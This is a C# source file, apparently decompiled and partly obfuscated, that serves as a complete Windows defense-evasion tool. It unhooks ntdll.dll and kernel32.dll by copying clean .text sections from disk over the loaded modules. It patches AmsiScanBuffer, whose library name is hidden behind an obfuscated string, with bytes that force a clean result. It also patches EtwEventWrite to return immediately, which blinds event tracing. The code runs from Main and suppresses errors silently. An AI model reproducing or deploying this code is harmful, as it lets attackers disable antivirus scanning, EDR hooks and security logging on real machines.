using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace EdvgVD
{
    // Token: 0x02000002 RID: 2
    internal class Class0
    {
// Token: 0x04000001 RID: 1
        private static readonly Process Process0 = Process.GetCurrentProcess();

// Token: 0x04000002 RID: 2
        private static readonly SnnkTwxWvo Kernel32CloseHandle = Marshal.GetDelegateForFunctionPointer<SnnkTwxWvo>(SussyVentPointerToLibWhatever(
            "kernel32.dll",
            "CloseHandle"));

// Token: 0x04000003 RID: 3
        private static readonly CsklprZdjd Kernel32FreeLibrary = Marshal.GetDelegateForFunctionPointer<CsklprZdjd>(SussyVentPointerToLibWhatever(
            "kernel32.dll",
            "FreeLibrary"));

// Token: 0x04000004 RID: 4
        private static readonly BuuqRlTrkB Kernel32VirtualProtect = Marshal.GetDelegateForFunctionPointer<BuuqRlTrkB>(SussyVentPointerToLibWhatever(
                "kernel32.dll",
                // MasterModule.StringDecode(
                //     "\udeb2\udec5\udece\uded0\uded1\udebd\udec8\udeac\udece\udecb\uded0\udec1\udebf\uded0",
                //     1052892764)
                "VirtualProtect"
            )
        );

// Token: 0x04000005 RID: 5
        private static readonly HGpyNxaPNy Kernel32CreateFileA = Marshal.GetDelegateForFunctionPointer<HGpyNxaPNy>(SussyVentPointerToLibWhatever(
            "kernel32.dll",
            "CreateFileA"));

// Token: 0x04000006 RID: 6
        private static readonly JgHrUYuwVv Kernel32CreateFileMappingA = Marshal.GetDelegateForFunctionPointer<JgHrUYuwVv>(SussyVentPointerToLibWhatever(
            "kernel32.dll",
            "CreateFileMappingA"));

// Token: 0x04000007 RID: 7
        private static readonly OZwpHxsXtH Kernel32MapViewOfFile = Marshal.GetDelegateForFunctionPointer<OZwpHxsXtH>(SussyVentPointerToLibWhatever(
            "kernel32.dll",
            "MapViewOfFile"));

// Token: 0x04000008 RID: 8
        private static readonly CgLuGvcMyS MemCpy = Marshal.GetDelegateForFunctionPointer<CgLuGvcMyS>(SussyVentPointerToLibWhatever(
            "msvcrt.dll",
            "memcpy"));

// Token: 0x04000009 RID: 9
        private static readonly RkpKtVNcwS GetModuleInformation = Marshal.GetDelegateForFunctionPointer<RkpKtVNcwS>(SussyVentPointerToLibWhatever(
            "psapi.dll",
            "GetModuleInformation"));

// Token: 0x0400000A RID: 10
        private static readonly QwvpmikZqq IsWow64Proc = Marshal.GetDelegateForFunctionPointer<QwvpmikZqq>(SussyVentPointerToLibWhatever(
            "kernel32.dll",
            "IsWow64Process"));

// Token: 0x06000002 RID: 2 RVA: 0x00002358 File Offset: 0x00000558
        public static void Main()
        {
            // 96515219;
            SusPatchHotLib("ntdll.dll");
            if (Environment.OSVersion.Version.Major >= 10 || IntPtr.Size == 8)
                SusPatchHotLib("kernel32.dll");
            SusSendPatchThings("￳￿\u0005￻￀￶￾￾",
                "AmsiScanBuffer",
                Convert.FromBase64String("uFcAB4DD"),
                Convert.FromBase64String("uFcAB4DCGAA="));
            SusSendPatchThings("ntdll.dll",
                "EtwEventWrite",
                Convert.FromBase64String("ww=="),
                Convert.FromBase64String("whQA"));
        }

// Token: 0x06000003 RID: 3 RVA: 0x00002DD8 File Offset: 0x00000FD8
        private static void SusSendPatchThings(string string0, string string1, byte[] byte0, byte[] byte1)
        {
            try
            {
                var intPtr = SussyVentPointerToLibWhatever(string0, string1);
                if (intPtr == IntPtr.Zero) throw new Exception();
                var size = IntPtr.Size;
                var num = 6;
                var num2 = num + sizeof(ushort);

                byte[] array;
                array = size == num2 ? byte0 : byte1;
                Kernel32VirtualProtect(intPtr, (IntPtr)array.Length,
                    64, out var newProtect);
                Marshal.Copy(array, 0, intPtr, array.Length);
                Kernel32VirtualProtect(intPtr, (IntPtr)array.Length, newProtect, out newProtect);
            }

            catch
            {
                // ignored
            }
        }

// Token: 0x06000004 RID: 4 RVA: 0x00002F70 File Offset: 0x00001170
        private static void SusPatchHotLib(string string0)
        {
            try
            {
                IsWow64Proc(Process0.Handle, out var flag);
                // 2;

                var str = "C:\\Windows\\System32\\";
                if (flag && IntPtr.Size == 4)
                    str = "C:\\Windows\\SysWOW64\\";
                var intPtr = SusDoSomethingWithPath(string0);
                if (!(intPtr == IntPtr.Zero))
                    unsafe
                    {
                        if (!GetModuleInformation(Process0.Handle, intPtr, out var rEIlnncGsj, (uint)sizeof(ReIlnncGsj))) return;
                        var intPtr2 = Kernel32CreateFileA(str + string0, 2147483648U,
                            1,
                            IntPtr.Zero,
                            3, 0U, IntPtr.Zero);
                        if (intPtr2 == (IntPtr)(-1))
                        {
                            Kernel32CloseHandle(intPtr2);
                        }
                        else
                        {
                            var intPtr3 = Kernel32CreateFileMappingA(intPtr2, IntPtr.Zero,
                                16777218, 0U, 0U, null);
                            if (intPtr3 == IntPtr.Zero)
                            {
                                Kernel32CloseHandle(intPtr3);
                            }
                            else
                            {
                                var intPtr4 = Kernel32MapViewOfFile(intPtr3,
                                    4, 0U, 0U,
                                    IntPtr.Zero);
                                if (intPtr4 == IntPtr.Zero) return;
                                var num2 = Marshal.ReadInt32((IntPtr)((long)rEIlnncGsj.BaseOfDll + 60));
                                var num3 = Marshal.ReadInt16((IntPtr)((long)intPtr + num2 + 6));
                                var num4 = Marshal.ReadInt16(intPtr,
                                    num2 + 20);
                                for (short num5 = 0;
                                     num5 < num3;
                                     num5 = (short)(num5 + 1))
                                {
                                    var intPtr5 = (IntPtr)((long)intPtr + num2 + 24 + num4 + num5 * 40);
                                    if (Marshal.ReadByte(intPtr5) != 46 ||
                                        Marshal.ReadByte((IntPtr)((long)intPtr5 + 1)) != 116 ||
                                        Marshal.ReadByte((IntPtr)((long)intPtr5 + 2)) != 101 ||
                                        Marshal.ReadByte((IntPtr)((long)intPtr5 + 3)) != 120 ||
                                        Marshal.ReadByte((IntPtr)((long)intPtr5 + 4)) != 116) continue;
                                    var num6 = Marshal.ReadInt32((IntPtr)((long)intPtr5 + 12));
                                    var num7 = (uint)Marshal.ReadInt32((IntPtr)((long)intPtr5 + 8));
                                    Kernel32VirtualProtect((IntPtr)((long)intPtr + num6), (IntPtr)num7, 64,
                                        out var newProtect);
                                    MemCpy((IntPtr)((long)intPtr + num6),
                                        (IntPtr)((long)intPtr4 + num6), (IntPtr)num7);
                                    Kernel32VirtualProtect((IntPtr)((long)intPtr + num6), (IntPtr)num7, newProtect,
                                        out newProtect);
                                    Kernel32CloseHandle(intPtr3);
                                    Kernel32CloseHandle(intPtr2);
                                    Kernel32FreeLibrary(intPtr);
                                    return;
                                }
                                // goto IL_B97;
                            }
                        }
                    }
            }

            catch
            {
                // ignored
            }
        }

// Token: 0x06000005 RID: 5 RVA: 0x00002050 File Offset: 0x00000250
        public static IntPtr SussyVentPointerToLibWhatever(string string0, string string1)
        {
            return SussyAmongPointer(SusDoSomethingWithPath(string0), string1);
        }

// Token: 0x06000006 RID: 6 RVA: 0x00003B5C File Offset: 0x00001D5C
        public static IntPtr SusDoSomethingWithPath(string string0)
        {
            var modules = Process0.Modules;
            foreach (var obj in modules)
            {
                var processModule = (ProcessModule)obj;
                if (processModule.FileName.ToLower().EndsWith(string0.ToLower())) return processModule.BaseAddress;
            }

            return IntPtr.Zero;
        }

// Token: 0x06000007 RID: 7 RVA: 0x00003BE0 File Offset: 0x00001DE0
        public static IntPtr SussyAmongPointer(IntPtr intptr0, string string0)
        {
            var intPtr = IntPtr.Zero;
            try
            {
                var num = intptr0.ToInt64();
                int num3;
                var num2 = 52;
                num3 = num2 + sizeof(ulong);

                var num4 = Marshal.ReadInt32((IntPtr)(num + num3));
                Marshal.ReadInt16((IntPtr)(intptr0.ToInt64() + num4 +
                                           20));
                var num5 = intptr0.ToInt64() + num4 + 24;
                var num6 = Marshal.ReadInt16((IntPtr)num5);
                long value;
                if (num6 == 267)
                    value = num5 + 96;
                else
                    value = num5 + 112;
                var num7 = Marshal.ReadInt32((IntPtr)value);
                var num8 = Marshal.ReadInt32((IntPtr)(intptr0.ToInt64() + num7 + 16));
                Marshal.ReadInt32((IntPtr)(intptr0.ToInt64() + num7 + 20));
                var num9 = Marshal.ReadInt32((IntPtr)(intptr0.ToInt64() + num7 +
                                                      24));
                var num10 = Marshal.ReadInt32((IntPtr)(intptr0.ToInt64() + num7 +
                                                       28));
                var num11 = Marshal.ReadInt32((IntPtr)(intptr0.ToInt64() + num7 +
                                                       32));
                var num12 = Marshal.ReadInt32((IntPtr)(intptr0.ToInt64() + num7 +
                                                       36));
                for (var i = 0; i < num9; i += 1)
                {
                    var text = Marshal.PtrToStringAnsi((IntPtr)(intptr0.ToInt64() + Marshal.ReadInt32(
                        (IntPtr)(intptr0.ToInt64() + num11 +
                                 i * 4))));
                    if (text == null || !text.Equals(string0,
                            (StringComparison)5)) continue;
                    var num13 = Marshal.ReadInt16((IntPtr)(intptr0.ToInt64() + num12 +
                                                           i * 2)) + num8;
                    var num14 = Marshal.ReadInt32((IntPtr)(intptr0.ToInt64() + num10 +
                                                           4 *
                                                           (num13 - num8)));
                    intPtr = (IntPtr)((long)intptr0 + num14);
                    break;
                }
            }

            catch
            {
                throw new InvalidOperationException();
            }

            if (intPtr == IntPtr.Zero) throw new MissingMethodException();
            return intPtr;
        }

// Token: 0x02000003 RID: 3
        public struct ReIlnncGsj
        {
// Token: 0x0400000B RID: 11
            public IntPtr BaseOfDll;

// Token: 0x0400000C RID: 12
            public uint SizeOfImage;

// Token: 0x0400000D RID: 13
            public IntPtr EntryPoint;
        }

// Token: 0x02000004 RID: 4
// (Invoke) Token: 0x0600000B RID: 11
        private delegate bool SnnkTwxWvo(IntPtr handle);

// Token: 0x02000005 RID: 5
// (Invoke) Token: 0x0600000F RID: 15
        private delegate bool CsklprZdjd(IntPtr module);

// Token: 0x02000006 RID: 6
// (Invoke) Token: 0x06000013 RID: 19
        private delegate int BuuqRlTrkB(IntPtr address, IntPtr size, uint newProtect, out uint oldProtect);

// Token: 0x02000007 RID: 7
// (Invoke) Token: 0x06000017 RID: 23
        private delegate IntPtr HGpyNxaPNy(string fileName, uint desiredAccess, uint shareMode,
            IntPtr securityAttributes,
            uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);

// Token: 0x02000008 RID: 8
// (Invoke) Token: 0x0600001B RID: 27
        private delegate IntPtr JgHrUYuwVv(IntPtr file, IntPtr fileMappingAttributes, uint protect,
            uint maximumSizeHigh,
            uint maximumSizeLow, string name);

// Token: 0x02000009 RID: 9
// (Invoke) Token: 0x0600001F RID: 31
        private delegate IntPtr OZwpHxsXtH(IntPtr fileMappingObject, uint desiredAccess, uint fileOffsetHigh,
            uint fileOffsetLow, IntPtr numberOfBytesToMap);

// Token: 0x0200000A RID: 10
// (Invoke) Token: 0x06000023 RID: 35
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate IntPtr CgLuGvcMyS(IntPtr dest, IntPtr src, IntPtr count);

// Token: 0x0200000B RID: 11
// (Invoke) Token: 0x06000027 RID: 39
        private delegate bool RkpKtVNcwS(IntPtr process, IntPtr module, out ReIlnncGsj moduleInfo, uint size);

// Token: 0x0200000C RID: 12
// (Invoke) Token: 0x0600002B RID: 43
        private delegate bool QwvpmikZqq([In] IntPtr hProcess, out bool wow64Process);
    }
}